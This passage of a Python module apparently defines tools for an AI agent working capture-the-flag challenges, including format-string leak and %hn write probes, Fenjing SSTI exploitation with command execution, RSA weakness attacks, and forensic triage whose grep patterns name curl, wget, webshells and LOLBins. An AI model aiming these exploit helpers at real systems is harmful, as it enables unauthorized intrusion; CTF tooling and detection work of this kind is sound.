        command = "command -v one_gadget >/dev/null || exit 127; " + " ".join(
            shlex.quote(part) for part in parts
        )
        return _result_text(await env.exec(command, timeout=180))

    return one_gadget


@register_tool(name="run_exploit", groups=["pwn", "reverse", "web", "crypto", "misc", "forensics"])
def make_run_exploit(*, env: CTFEnvironment, state=None, observe_target_output=None, **_) -> object:
    from langchain_core.tools import tool

    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")

    @tool
    async def run_exploit(
        script: str = "solve.py", mode: str = "local", timeout_seconds: int = 120
    ) -> str:
        """Syntax-check and run a Python solve script locally or on the target.

        The script should accept pwntools-style ``LOCAL=1`` and
        ``REMOTE=1 HOST=<host> PORT=<port>`` arguments. Target mode is bound to
        the evaluator-provided endpoint and records output provenance. Scripts
        may use pwntools, sockets, or HTTP clients.
        """
        mode = {"remote": "target", "local_process": "local"}.get(
            mode.strip().lower(), mode.strip().lower()
        )
        if mode not in {"local", "target"}:
            raise ValueError("mode must be local or target")
        if timeout_seconds < 1 or timeout_seconds > 600:
            raise ValueError("timeout_seconds must be between 1 and 600")
        environment = ["env"]
        args = ["python3", script]
        if mode == "local":
            environment.append("LOCAL=1")
            args.append("LOCAL=1")
        else:
            if not remote or ":" not in remote:
                raise ValueError("target mode requires an evaluator-provided host:port")
            host, raw_port = remote.rsplit(":", 1)
            if not host or not raw_port.isdigit() or not 1 <= int(raw_port) <= 65535:
                raise ValueError("the evaluator-provided target is not host:port")
            environment += ["REMOTE=1", f"HOST={host}", f"PORT={raw_port}"]
            args += ["REMOTE=1", f"HOST={host}", f"PORT={raw_port}"]
        quoted_script = shlex.quote(script)
        command = (
            f"python3 -m py_compile {quoted_script} && "
            f"timeout {timeout_seconds}s "
            + " ".join(shlex.quote(part) for part in environment + args)
        )
        result = await env.exec(command, timeout=timeout_seconds + 15)
        rendered = _result_text(result)
        if mode == "target" and observe_target_output is not None:
            observe_target_output(f"{result.stdout}\n{result.stderr}")
        return rendered

    return run_exploit


@register_tool(name="fmtstr_probe", groups=["pwn"])
def make_fmtstr_probe(*, env: CTFEnvironment, state=None, observe_target_output=None, **_) -> object:
    from langchain_core.tools import tool

    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")

    @tool
    async def fmtstr_probe(
        mode: str = "local",
        binary: str = "",
        prompt: str = "",
        start_index: int = 1,
        end_index: int = 40,
    ) -> str:
        """Send one bounded positional format-string leak probe.

        The payload begins with ``AAAABBBB`` and prints indexed pointers between
        ``start_index`` and ``end_index``. Use the marker value and surrounding
        pointers to determine the controlled argument index and address classes.
        Target mode is bound to the evaluator-provided endpoint.
        """
        mode = {"remote": "target", "local_process": "local"}.get(
            mode.strip().lower(), mode.strip().lower()
        )
        if mode not in {"local", "target"}:
            raise ValueError("mode must be local or target")
        if start_index < 1 or end_index < start_index or end_index > 100:
            raise ValueError("format-string index range must be within 1..100")
        host = ""
        port = 0
        if mode == "local":
            if not binary:
                raise ValueError("local mode requires a binary")
        else:
            if not remote or ":" not in remote:
                raise ValueError("target mode requires an evaluator-provided host:port")
            host, raw_port = remote.rsplit(":", 1)
            if not host or not raw_port.isdigit() or not 1 <= int(raw_port) <= 65535:
                raise ValueError("the evaluator-provided target is not host:port")
            port = int(raw_port)
        program = f"""from pwn import *
context.log_level = 'error'
io = process({binary!r}) if {mode!r} == 'local' else remote({host!r}, {port})
if {prompt!r}:
    io.recvuntil({prompt!r}.encode())
payload = b'AAAABBBB|' + b'|'.join(f'%{{i}}$p'.encode() for i in range({start_index}, {end_index + 1})) + b'|END'
io.sendline(payload)
data = io.recvrepeat(2)
print(data.decode(errors='replace'))
print('[payload_hex]', payload.hex())
io.close()
"""
        encoded = base64.b64encode(program.encode()).decode()
        command = f"printf %s {encoded} | base64 -d | python3 -"
        result = await env.exec(command, timeout=45)
        if mode == "target" and observe_target_output is not None:
            observe_target_output(f"{result.stdout}\n{result.stderr}")
        return _result_text(result)

    return fmtstr_probe


@register_tool(name="fmtstr_write_scan", groups=["pwn"])
def make_fmtstr_write_scan(
    *, env: CTFEnvironment, state=None, observe_target_output=None, **_
) -> object:
    from langchain_core.tools import tool

    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")

    @tool
    async def fmtstr_write_scan(
        value: int,
        mode: str = "target",
        binary: str = "",
        prompt: str = ">> ",
        start_index: int = 1,
        end_index: int = 30,
    ) -> str:
        """Try a bounded positional ``%hn`` write for a stack-resident pointer.

        Use only after static/dynamic evidence shows an uncontrolled printf, a
        desired 16-bit value, and a likely pointer already present in printf's
        argument area. Each index gets a fresh local process or target
        connection. Output is whitespace-compacted and scanning stops on a flag
        shaped response or an explicit success message.
        """
        normalized = {"remote": "target", "local_process": "local"}.get(
            mode.strip().lower(), mode.strip().lower()
        )
        if normalized not in {"local", "target"}:
            raise ValueError("mode must be local or target")
        if not 1 <= value <= 0xFFFF:
            raise ValueError("value must fit one non-zero 16-bit halfword")
        if start_index < 1 or end_index < start_index or end_index > 100:
            raise ValueError("format-string index range must be within 1..100")
        if end_index - start_index + 1 > 40:
            raise ValueError("one scan may cover at most 40 indexes")
        host = ""
        port = 0
        if normalized == "local":
            if not binary:
                raise ValueError("local mode requires a binary")
        else:
            if not remote or ":" not in remote:
                raise ValueError("target mode requires an evaluator-provided host:port")
            host, raw_port = remote.rsplit(":", 1)
            if not host or not raw_port.isdigit() or not 1 <= int(raw_port) <= 65535:
                raise ValueError("the evaluator-provided target is not host:port")
            port = int(raw_port)
        program = f"""from pwn import *
context.log_level = 'error'
for index in range({start_index}, {end_index + 1}):
    io = None
    try:
        io = process({binary!r}) if {normalized!r} == 'local' else remote({host!r}, {port})
        if {prompt!r}:
            io.recvuntil({prompt!r}.encode(), timeout=2)
        payload = f'%{{{value}}}c%{{index}}$hn'.encode()
        io.sendline(payload)
        data = io.recvrepeat(1)
        text = data.decode(errors='replace')
        compact = ' '.join(text.split())[-1200:]
        print(f'[index={{index}}] {{compact}}')
        lowered = text.lower()
        if ('{{' in text and '}}' in text) or 'managed to deceive' in lowered:
            break
    except Exception as exc:
        print(f'[index={{index}} error={{type(exc).__name__}}]')
    finally:
        if io is not None:
            io.close()
"""
        encoded = base64.b64encode(program.encode()).decode()
        command = f"printf %s {encoded} | base64 -d | python3 -"
        result = await env.exec(command, timeout=180)
        if normalized == "target" and observe_target_output is not None:
            observe_target_output(f"{result.stdout}\n{result.stderr}")
        return _result_text(result)

    return fmtstr_write_scan


@register_tool(name="r2_interact", groups=["reverse", "pwn"])
def make_r2_interact(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    state: dict[str, DockerInteractiveSession | None] = {"session": None}

    async def _ensure(binary: str | None) -> DockerInteractiveSession:
        if state["session"] is None:
            # -q0 prints a NUL then enters interactive; analysis commands like aaa work.
            sess = DockerInteractiveSession(
                launch_cmd="r2" + (f" {binary}" if binary else " -"),
                prompt="[0x",
                container_id=env.container_id,
                workdir=env.workdir,
            )
            await sess.start()
            state["session"] = sess
        session = state["session"]
        assert session is not None
        return session

    @tool
    async def r2_interact(command: str, binary: str = "") -> str:
        """Drive an interactive radare2 session. Pass ``binary`` on first call.

        Then send r2 commands: "aaa" (analyze), "afl" (list funcs),
        "pdf @ main" (disasm main), "iz" (strings), "s sym.main" (seek).
        Falls back to a hint if radare2 is not installed in the image.
        """
        if state["session"] is None:
            probe = await env.exec("command -v r2 || command -v radare2 || true")
            if not probe.stdout.strip():
                return (
                    "[radare2 not installed in this image; use run_shell with "
                    "objdump -d / strings / nm, or gdb_tool for disassembly]"
                )
        sess = await _ensure(binary or None)
        out = await sess.send(command, timeout=60.0)
        return summarize(out) if out.strip() else "(no output)"

    return r2_interact


@register_tool(name="ghidra_headless", groups=["reverse"])
def make_ghidra_headless(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def ghidra_headless(binary: str) -> str:
        """Run Ghidra headless analysis and dump decompiled C for a binary.

        Requires ghidra to be installed in the image; if absent, returns a hint
        to use r2_interact's decompiler (pdc) instead.
        """
        check = await env.exec("command -v analyzeHeadless || true")
        if not check.stdout.strip():
            return "[ghidra not installed in image; use r2_interact 'pdc @ main' for decompilation]"
        res = await env.exec(
            "rm -rf /tmp/ghp && mkdir -p /tmp/ghp && "
            f"analyzeHeadless /tmp/ghp proj -import {binary} "
            "-postScript DecompileScript.java -deleteProject 2>&1 | tail -200",
            timeout=600,
        )
        return summarize(res.stdout or res.stderr or "(no output)")

    return ghidra_headless


@register_tool(name="pyinstaller_extract", groups=["reverse"])
def make_pyinstaller_extract(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def pyinstaller_extract(binary: str, info_only: bool = False) -> str:
        """Inspect or extract a PyInstaller-built ELF/PE executable.

        Extraction creates ``<binary>_extracted`` and recovers its bundled PYZ
        bytecode without needing the original Python interpreter version.
        """
        parts = ["pyinstxtractor-ng"]
        if info_only:
            parts.append("--info")
        parts.append(binary)
        command = "command -v pyinstxtractor-ng >/dev/null || exit 127; " + " ".join(
            shlex.quote(part) for part in parts
        )
        return _result_text(await env.exec(command, timeout=180))

    return pyinstaller_extract


@register_tool(name="android_decompile", groups=["reverse"])
def make_android_decompile(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def android_decompile(
        artifact: str, output_dir: str = "jadx_out", resources: bool = True
    ) -> str:
        """Decompile an APK or DEX artifact with JADX into a writable directory.

        Returns a compact file inventory and high-value strings after the
        decompiler finishes. Disable ``resources`` for a faster source-only run.
        """
        parts = ["jadx", "--output-dir", output_dir]
        if not resources:
            parts.append("--no-res")
        parts.append(artifact)
        command = (
            "command -v jadx >/dev/null || exit 127; "
            + " ".join(shlex.quote(part) for part in parts)
            + "; status=$?; "
            + f"find {shlex.quote(output_dir)} -type f | head -80; "
            + f"grep -RIE 'flag|secret|password|token|native' {shlex.quote(output_dir)} "
            + "2>/dev/null | head -100; exit $status"
        )
        return _result_text(await env.exec(command, timeout=600))

    return android_decompile


@register_tool(name="http_request", groups=["web"])
def make_http_request(*, env: CTFEnvironment, state=None, observe_target_output=None, **_) -> object:
    from langchain_core.tools import tool

    default_remote = None
    if state is not None:
        default_remote = (state.get("challenge") or {}).get("remote")

    @tool
    async def http_request(
        url: str = "",
        method: str = "GET",
        data: str = "",
        headers: str = "",
    ) -> str:
        """Make an HTTP request from inside the container (curl).

        ``url`` may be a full URL or path (prefixed with the challenge remote).
        ``headers`` is a ';'-separated list like 'A: 1; B: 2'. Returns response
        headers + body.
        """
        target = url
        if url.startswith("/") and default_remote:
            target = f"http://{default_remote}{url}"
        parts = ["curl", "-sS", "-i", "-X", method]
        for h in filter(None, (h.strip() for h in headers.split(";"))):
            parts += ["-H", f"{h!r}"]
        if data:
            parts += ["--data", f"{data!r}"]
        parts.append(f"{target!r}")
        res = await env.exec(" ".join(parts), timeout=30)
        if observe_target_output is not None:
            observe_target_output(f"{res.stdout}\n{res.stderr}")
        return summarize(res.stdout or res.stderr or "(no response)")

    return http_request


@register_tool(name="fenjing_ssti", groups=["web"])
def make_fenjing_ssti(*, env: CTFEnvironment, state=None, observe_target_output=None, **_) -> object:
    from langchain_core.tools import tool

    remote = None
    if state is not None:
        remote = (state.get("challenge") or {}).get("remote")

    @tool
    async def fenjing_ssti(
        url: str = "",
        mode: str = "scan",
        method: str = "GET",
        inputs: str = "",
        command: str = "id",
        json_data: str = "",
        json_key: str = "",
    ) -> str:
        """Run Fenjing against a CTF Jinja2 SSTI endpoint.

        Modes: ``scan`` discovers forms/parameters, ``crack`` targets named
        comma-separated ``inputs``, and ``crack-json`` targets ``json_key`` in
        ``json_data``. Fenjing fingerprints the filter and generates a bypass.
        """
        if mode not in {"scan", "crack", "crack-json"}:
            raise ValueError("mode must be scan, crack, or crack-json")
        method = method.upper()
        if method not in {"GET", "POST"}:
            raise ValueError("method must be GET or POST")
        target = _challenge_url(url, remote)
        parts = ["fenjing", mode, "--url", target, "--detect-mode", "fast"]
        if mode == "crack":
            if not inputs.strip():
                raise ValueError("crack mode requires comma-separated inputs")
            parts += ["--method", method, "--inputs", inputs]
        elif mode == "crack-json":
            if not json_data or not json_key:
                raise ValueError("crack-json requires json_data and json_key")
            parts += ["--json-data", json_data, "--key", json_key]
        if command:
            parts += ["--exec-cmd", command]
        shell_command = "command -v fenjing >/dev/null || exit 127; " + " ".join(
            shlex.quote(part) for part in parts
        )
        result = await env.exec(shell_command, timeout=300)
        if observe_target_output is not None:
            observe_target_output(f"{result.stdout}\n{result.stderr}")
        return _result_text(result)

    return fenjing_ssti


@register_tool(name="xor_analyze", groups=["crypto"])
def make_xor_analyze(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def xor_analyze(
        path: str,
        key_length: int = 0,
        most_frequent_hex: str = "",
        known_plaintext: str = "",
        hex_input: bool = False,
        max_key_length: int = 65,
    ) -> str:
        """Analyze a repeating-key XOR ciphertext and write candidates to xortool_out.

        Use a likely frequent byte (20 for text, 00 for binaries), a known flag
        prefix, or a suspected key length to reduce candidate noise.
        """
        if key_length < 0 or max_key_length < 1 or max_key_length > 4096:
            raise ValueError("invalid key length")
        parts = ["xortool"]
        if hex_input:
            parts.append("--hex")
        if key_length:
            parts += ["--key-length", str(key_length)]
        else:
            parts += ["--max-keylen", str(max_key_length)]
        if most_frequent_hex:
            parts += ["--char", most_frequent_hex]
        if known_plaintext:
            parts += ["--known-plaintext", known_plaintext, "--filter-output"]
        parts.append(path)
        command = "command -v xortool >/dev/null || exit 127; " + " ".join(
            shlex.quote(part) for part in parts
        )
        return _result_text(await env.exec(command, timeout=180))

    return xor_analyze


@register_tool(name="rsa_quickcheck", groups=["crypto"])
def make_rsa_quickcheck(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def rsa_quickcheck(
        n: str,
        e: str,
        c: str,
        p: str = "",
        q: str = "",
        fermat_iterations: int = 50000,
    ) -> str:
        """Run bounded, offline checks for common textbook RSA weaknesses.

        Integers accept decimal or ``0x`` notation. Checks supplied factors,
        exact low-exponent plaintext roots, Wiener's small-d attack, and bounded
        Fermat close-prime factorization. Every recovered factor is multiplied
        back to ``n`` before plaintext bytes are emitted.
        """
        if fermat_iterations < 0 or fermat_iterations > 500000:
            raise ValueError("fermat_iterations must be between 0 and 500000")
        values = {"n": n, "e": e, "c": c, "p": p, "q": q}
        encoded_values = base64.b64encode(repr(values).encode()).decode()
        program = f"""import ast, base64, math
from sympy import integer_nthroot
v=ast.literal_eval(base64.b64decode({encoded_values!r}).decode())
def num(x): return int(x, 0) if isinstance(x, str) else int(x)
n,e,c=num(v['n']),num(v['e']),num(v['c'])
def show(tag, factors=None, message=None):
    print('[attack='+tag+']')
    if factors:
        p,q=factors
        assert p*q==n
        phi=(p-1)*(q-1)
        if math.gcd(e,phi)!=1:
            print('factors_verified=true gcd_e_phi='+str(math.gcd(e,phi)))
            return True
        d=pow(e,-1,phi); m=pow(c,d,n)
    else: m=message
    raw=m.to_bytes(max(1,(m.bit_length()+7)//8),'big')
    print('plaintext_hex='+raw.hex())
    print('plaintext_repr='+repr(raw))
    return True
if v['p'] or v['q']:
    known=num(v['p'] or v['q'])
    if known>1 and n%known==0: show('supplied-factor',(known,n//known)); raise SystemExit
root,exact=integer_nthroot(c,e)
if exact: show('exact-small-exponent-root',message=int(root)); raise SystemExit
def convergents(a,b):
    cf=[]
    while b: cf.append(a//b); a,b=b,a%b
    p0,p1,q0,q1=0,1,1,0
    for x in cf:
        p0,p1=p1,x*p1+p0; q0,q1=q1,x*q1+q0
        yield p1,q1
for k,d in convergents(e,n):
    if k and (e*d-1)%k==0:
        phi=(e*d-1)//k; s=n-phi+1; disc=s*s-4*n
        if disc>=0:
            t=math.isqrt(disc)
            if t*t==disc and (s+t)%2==0:
                fp,fq=(s+t)//2,(s-t)//2
                if fp>1 and fp*fq==n: show('wiener',(fp,fq)); raise SystemExit
a=math.isqrt(n)
if a*a<n: a+=1
for _ in range({fermat_iterations}):
    b2=a*a-n; b=math.isqrt(b2)
    if b*b==b2 and a-b>1: show('fermat',(a-b,a+b)); raise SystemExit
    a+=1
print('[no-quick-attack] exact_root=false wiener=false fermat_iterations={fermat_iterations}')
"""
        encoded = base64.b64encode(program.encode()).decode()
        command = f"printf %s {encoded} | base64 -d | python3 -"
        return _result_text(await env.exec(command, timeout=180))

    return rsa_quickcheck


@register_tool(name="stego_scan", groups=["misc", "forensics"])
def make_stego_scan(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def stego_scan(
        path: str, extract_channel: str = "", scan_all: bool = False
    ) -> str:
        """Detect PNG/BMP LSB data with zsteg and optionally extract one channel.

        ``extract_channel`` is a zsteg channel descriptor such as
        ``1b,rgb,lsb``. Set ``scan_all`` only when the shorter default scan does
        not find useful evidence because it can produce a large result set.
        """
        parts = ["zsteg"]
        if extract_channel:
            parts += ["--extract", extract_channel]
        elif scan_all:
            parts.append("--all")
        parts.append(path)
        command = "command -v zsteg >/dev/null || exit 127; " + " ".join(
            shlex.quote(part) for part in parts
        )
        return _result_text(await env.exec(command, timeout=180))

    return stego_scan


@register_tool(name="artifact_triage", groups=["misc", "forensics"])
def make_artifact_triage(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def artifact_triage(path: str) -> str:
        """Read-only triage for archives, images, documents, and nested files."""
        target = shlex.quote(path)
        command = (
            f"file {target}; echo '[metadata]'; exiftool {target} 2>/dev/null | head -100; "
            f"echo '[archive-members]'; 7z l -slt {target} 2>/dev/null | head -180; "
            f"echo '[embedded-signatures]'; binwalk {target} 2>/dev/null | head -100; "
            f"echo '[high-value-strings]'; strings -a -n 6 {target} 2>/dev/null | "
            "grep -Ei 'flag|ctf|password|secret|token|user|http|BEGIN ' | head -160"
        )
        return _result_text(await env.exec(command, timeout=120))

    return artifact_triage


@register_tool(name="log_triage", groups=["forensics"])
def make_log_triage(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def log_triage(path: str = ".") -> str:
        """Build a bounded first-pass inventory of incident and application logs."""
        root = shlex.quote(path)
        pattern = (
            r"failed|failure|invalid|error|denied|unauthorized|login|sudo|ssh|"
            r"powershell|cmd\.exe|/bin/sh|base64|curl|wget|upload|webshell|"
            r"union[ +]select|\.\./|%2e|flag|secret"
        )
        command = (
            f"echo '[log-files]'; find {root} -maxdepth 5 -type f -print | head -160; "
            f"echo '[high-value-events]'; grep -RInaE --binary-files=without-match "
            f"--exclude-dir=.git {shlex.quote(pattern)} {root} 2>/dev/null | head -260"
        )
        return _result_text(await env.exec(command, timeout=120))

    return log_triage


@register_tool(name="memory_analyze", groups=["forensics"])
def make_memory_analyze(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def memory_analyze(
        image: str, plugin: str = "windows.info", output_dir: str = "volatility_out"
    ) -> str:
        """Run one named Volatility 3 plugin against a memory image.

        Start with an OS information plugin, then use process, network, command
        line, file, registry, or malware plugins supported by the image profile.
        Extracted artifacts are written under ``output_dir``.
        """
        if not re.fullmatch(r"[A-Za-z0-9_.]+", plugin):
            raise ValueError("plugin must be a Volatility dotted plugin name")
        parts = ["vol", "-q", "-f", image, "-o", output_dir, plugin]
        command = (
            "command -v vol >/dev/null || exit 127; mkdir -p -- "
            + shlex.quote(output_dir)
            + "; "
            + " ".join(shlex.quote(part) for part in parts)
        )
        return _result_text(await env.exec(command, timeout=600))

    return memory_analyze


@register_tool(name="evtx_triage", groups=["forensics"])
def make_evtx_triage(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def evtx_triage(
        path: str, output: str = "evtx_events.xml", event_ids: str = ""
    ) -> str:
        """Convert Windows EVTX to XML and show high-value security events.

        ``event_ids`` may be a comma-separated numeric allowlist. With no
        allowlist, the tool focuses on logon, process, service, PowerShell,
        scheduled-task, account, and log-clearing events.
        """
        if event_ids:
            ids = [item.strip() for item in event_ids.split(",") if item.strip()]
            if not ids or any(not item.isdigit() for item in ids) or len(ids) > 40:
                raise ValueError("event_ids must contain at most 40 comma-separated integers")
        else:
            ids = [
                "1102", "4103", "4104", "4624", "4625", "4648", "4672",
                "4688", "4697", "4698", "4720", "4728", "4732", "4768",
                "4769", "4776", "7045",
            ]
        event_pattern = "|".join(ids)
        source = shlex.quote(path)
        destination = shlex.quote(output)
        pattern = shlex.quote(
            rf">({event_pattern})<|powershell|encodedcommand|cmd\.exe|rundll32|"
            r"certutil|bitsadmin|mshta|wscript|cscript|\\temp\\|\\users\\public\\"
        )
        command = (
            "command -v evtx_dump >/dev/null || exit 127; "
            f"evtx_dump {source} > {destination}; "
            f"echo '[events-file]'; wc -c {destination}; "
            f"echo '[high-value-records]'; grep -Eina -B4 -A14 {pattern} {destination} "
            "2>/dev/null | head -320"
        )
        return _result_text(await env.exec(command, timeout=600))

    return evtx_triage


@register_tool(name="disk_image_triage", groups=["forensics"])
def make_disk_image_triage(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def disk_image_triage(image: str, offset_sectors: int = 0) -> str:
        """Inspect a disk image partition table and list filesystem entries.

        ``offset_sectors`` selects a partition start reported by mmls. A zero
        offset performs partition discovery and a best-effort root listing.
        """
        if offset_sectors < 0:
            raise ValueError("offset_sectors must be non-negative")
        path = shlex.quote(image)
        command = f"mmls {path}; echo '[filesystem-root]'; fls -r -o {offset_sectors} {path} | head -200"
        return _result_text(await env.exec(command, timeout=300))

    return disk_image_triage


@register_tool(name="filesystem_recover", groups=["forensics"])
def make_filesystem_recover(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def filesystem_recover(
        image: str,
        offset_sectors: int = 0,
        inode: str = "",
        output: str = "recovered.bin",
    ) -> str:
        """List deleted filesystem entries or recover one observed TSK inode.

        Call without ``inode`` to list deleted entries. Pass an inode exactly as
        reported by ``fls`` to extract it with ``icat`` into ``output``.
        """
        if offset_sectors < 0:
            raise ValueError("offset_sectors must be non-negative")
        source = shlex.quote(image)
        if not inode:
            command = f"fls -r -d -o {offset_sectors} {source} | head -260"
        else:
            if not re.fullmatch(r"[0-9-]{1,80}", inode):
                raise ValueError("inode must be copied from fls output")
            destination = shlex.quote(output)
            command = (
                f"icat -o {offset_sectors} {source} {shlex.quote(inode)} > {destination}; "
                f"file {destination}; sha256sum {destination}; "
                f"strings -a -n 6 {destination} | "
                "grep -Ei 'flag|ctf|password|secret|token' | head -100"
            )
        return _result_text(await env.exec(command, timeout=300))

    return filesystem_recover


@register_tool(name="pcap_triage", groups=["forensics"])
def make_pcap_triage(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def pcap_triage(
        capture: str, display_filter: str = "", follow_tcp_stream: int = -1
    ) -> str:
        """Summarize a PCAP/PCAPNG or follow one TCP stream with tshark.

        With no stream selected, reports capture metadata, protocol hierarchy,
        conversations, DNS names and common plaintext request fields. Set
        ``follow_tcp_stream`` to an observed index for its ASCII transcript.
        ``display_filter`` narrows packet-derived fields.
        """
        if follow_tcp_stream < -1:
            raise ValueError("follow_tcp_stream must be -1 or a non-negative index")
        path = shlex.quote(capture)
        if follow_tcp_stream >= 0:
            command = (
                f"tshark -r {path} -q -z "
                + shlex.quote(f"follow,tcp,ascii,{follow_tcp_stream}")
            )
        else:
            filter_part = f" -Y {shlex.quote(display_filter)}" if display_filter else ""
            command = (
                f"capinfos {path}; echo '[protocols]'; tshark -r {path} -q -z io,phs; "
                f"echo '[conversations]'; tshark -r {path} -q -z conv,tcp; "
                f"echo '[high-value-fields]'; tshark -r {path}{filter_part} -T fields "
                "-e tcp.stream -e ip.src -e ip.dst -e dns.qry.name -e http.request.method "
                "-e http.host -e http.request.uri -e ftp.request.command -e ftp.request.arg "
                "2>/dev/null | head -240"
            )
        return _result_text(await env.exec(command, timeout=300))

    return pcap_triage


@register_tool(name="pcap_export_objects", groups=["forensics"])
def make_pcap_export_objects(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def pcap_export_objects(
        capture: str, protocol: str = "http", output_dir: str = "pcap_objects"
    ) -> str:
        """Export transferred objects from a PCAP using a supported protocol."""
        allowed = {"http", "smb", "tftp", "ftp-data", "dicom", "imf"}
        if protocol not in allowed:
            raise ValueError(f"protocol must be one of {sorted(allowed)}")
        source = shlex.quote(capture)
        destination = shlex.quote(output_dir)
        export = shlex.quote(f"{protocol},{output_dir}")
        command = (
            f"rm -rf -- {destination}; mkdir -p -- {destination}; "
            f"tshark -r {source} --export-objects {export} >/dev/null 2>&1; "
            f"echo '[objects]'; find {destination} -maxdepth 2 -type f -exec file {{}} \\; "
            "2>/dev/null | head -200; "
            f"echo '[high-value-strings]'; grep -RInaE --binary-files=without-match "
            f"'flag|ctf|password|secret|token' {destination} 2>/dev/null | head -160"
        )
        return _result_text(await env.exec(command, timeout=300))

    return pcap_export_objects


@register_tool(name="pcap_artifact_extract", groups=["forensics"])
def make_pcap_artifact_extract(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    program = r'''import hashlib
import json
import pathlib
import shutil
import subprocess
import sys

capture, protocol, output = sys.argv[1:]
root = pathlib.Path(output).resolve()
shutil.rmtree(root, ignore_errors=True)
raw = root / "raw"
normalized = root / "normalized"
raw.mkdir(parents=True)
normalized.mkdir()
subprocess.run(
    ["tshark", "-r", capture, "-q", "--export-objects", f"{protocol},{raw}"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=240, check=False,
)
records = []
for index, source in enumerate(sorted(path for path in raw.iterdir() if path.is_file())):
    suffix = source.suffix if len(source.suffix) <= 12 else ""
    safe = normalized / f"artifact-{index:03d}{suffix}"
    shutil.copyfile(source, safe)
    data = safe.read_bytes()
    records.append({"path": safe.as_posix(), "original_name": source.name,
                    "size": len(data), "sha256": hashlib.sha256(data).hexdigest()})
print(json.dumps(records, ensure_ascii=False, indent=2))
'''

    @tool
    async def pcap_artifact_extract(
        capture: str, protocol: str = "http", output_dir: str = "/ctf/pcap_artifacts"
    ) -> str:
        """Export PCAP objects to safe numbered paths with names, sizes, and hashes."""
        allowed = {"http", "smb", "tftp", "ftp-data", "dicom", "imf"}
        if protocol not in allowed:
            raise ValueError(f"protocol must be one of {sorted(allowed)}")
        encoded = base64.b64encode(program.encode()).decode()
        command = (
            f"python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\" "
            f"{shlex.quote(capture)} {shlex.quote(protocol)} {shlex.quote(output_dir)}; "
            f"find {shlex.quote(output_dir)}/normalized -maxdepth 1 -type f -exec file {{}} \\;"
        )
        return _result_text(await env.exec(command, timeout=360))

    return pcap_artifact_extract


@register_tool(name="pcap_tls_recover", groups=["forensics"])
def make_pcap_tls_recover(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    program = r'''import hashlib
import json
import pathlib
import re
import shutil
import subprocess
import sys

capture = pathlib.Path(sys.argv[1]).resolve()
root = pathlib.Path(sys.argv[2]).resolve()
shutil.rmtree(root, ignore_errors=True)
clear = root / "clear-http"
decrypted = root / "decrypted-http"
normalized = root / "normalized"
for directory in (clear, decrypted, normalized):
    directory.mkdir(parents=True, exist_ok=True)
subprocess.run(
    ["tshark", "-r", str(capture), "-q", "--export-objects", f"http,{clear}"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180, check=False,
)
secret = re.compile(
    rb"(?m)^(?:CLIENT_RANDOM|CLIENT_EARLY_TRAFFIC_SECRET|CLIENT_HANDSHAKE_TRAFFIC_SECRET|"
    rb"SERVER_HANDSHAKE_TRAFFIC_SECRET|CLIENT_TRAFFIC_SECRET_0|SERVER_TRAFFIC_SECRET_0) "
    rb"[0-9A-Fa-f]+ [0-9A-Fa-f]+\s*$"
)
keylogs = [path for path in clear.rglob("*")
           if path.is_file() and secret.search(path.read_bytes()[:8 * 1024 * 1024])]
http_rows = []
for keylog in keylogs:
    subprocess.run(
        ["tshark", "-r", str(capture), "-o", f"tls.keylog_file:{keylog}", "-q",
         "--export-objects", f"http,{decrypted}"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180, check=False,
    )
    result = subprocess.run(
        ["tshark", "-r", str(capture), "-o", f"tls.keylog_file:{keylog}",
         "-Y", "http", "-T", "fields", "-e", "tcp.stream", "-e", "http.request.method",
         "-e", "http.host", "-e", "http.request.uri", "-e", "http.file_data"],
        capture_output=True, text=True, errors="replace", timeout=180, check=False,
    )
    http_rows.extend(result.stdout.splitlines()[:240])
records = []
sources = [("clear", path) for path in clear.iterdir() if path.is_file()]
sources += [("decrypted", path) for path in decrypted.iterdir() if path.is_file()]
for index, (layer, source) in enumerate(sorted(sources, key=lambda item: (item[0], item[1].name))):
    suffix = source.suffix if len(source.suffix) <= 12 else ""
    safe = normalized / f"artifact-{index:03d}{suffix}"
    shutil.copyfile(source, safe)
    data = safe.read_bytes()
    records.append({"path": safe.as_posix(), "layer": layer,
                    "original_name": source.name, "size": len(data),
                    "sha256": hashlib.sha256(data).hexdigest()})
shutil.rmtree(clear, ignore_errors=True)
shutil.rmtree(decrypted, ignore_errors=True)
print(f"keylog_candidates={len(keylogs)}")
print("[http-fields]")
print("\n".join(http_rows))
print("[artifact-manifest]")
print(json.dumps(records, ensure_ascii=False, indent=2))
'''

    @tool
    async def pcap_tls_recover(
        capture: str, output_dir: str = "/ctf/pcap_tls_recovered"
    ) -> str:
        """Use an HTTP-leaked SSLKEYLOGFILE to recover TLS-carried HTTP artifacts."""
        encoded = base64.b64encode(program.encode()).decode()
        command = (
            f"python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\" "
            f"{shlex.quote(capture)} {shlex.quote(output_dir)}"
        )
